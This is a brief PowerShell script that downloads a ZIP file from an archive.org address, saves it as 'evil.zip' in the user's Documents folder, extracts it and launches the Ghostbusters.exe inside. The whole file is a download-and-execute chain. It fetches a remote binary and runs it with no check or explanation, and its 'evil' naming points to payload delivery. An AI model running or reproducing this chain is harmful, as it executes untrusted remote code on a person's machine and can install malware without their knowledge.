$url = "https://ia801601.us.archive.org/26/items/Ghostbusters_Remake/ghostbusters.zip"
$destination = "$env:USERPROFILE\Documents\evil.zip"
Invoke-WebRequest -Uri $url -OutFile $destination



#Extract the ZIP file:
$zipPath = "$env:USERPROFILE\Documents\evil.zip"
$extractPath = "$env:USERPROFILE\Documents\evil"
Expand-Archive -Path $zipPath -DestinationPath $extractPath -F

#Run the EXE file:
$exePath = "$env:USERPROFILE\Documents\evil\Ghostbusters.exe"
Start-Process -FilePath $exePath

